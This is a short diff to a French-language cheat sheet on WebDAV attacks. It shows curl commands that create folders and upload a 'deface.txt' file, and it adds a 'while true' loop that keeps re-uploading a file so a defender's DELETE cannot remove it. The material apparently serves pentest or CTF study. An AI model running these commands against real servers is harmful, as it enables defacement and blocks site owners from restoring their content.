@@ -44,4 +44,10 @@ curl -X MKCOL 'https://exemple.com/new_folder'
 curl -T '/path/to/local/deface.txt' 'https://example.com/test/'
 ```
 
+## Faire une boucle pour bloquer le fichier :
+> Donc ceci permet de bloquer un curl -X DELETE, en effet il télecharge à l'infini le fichier sur le serveur webdav donc voici ce qui faut faire:
+```sh
+while true; do curl -T 'fichier.html' 'https://example.com' ; done
+```
+
 
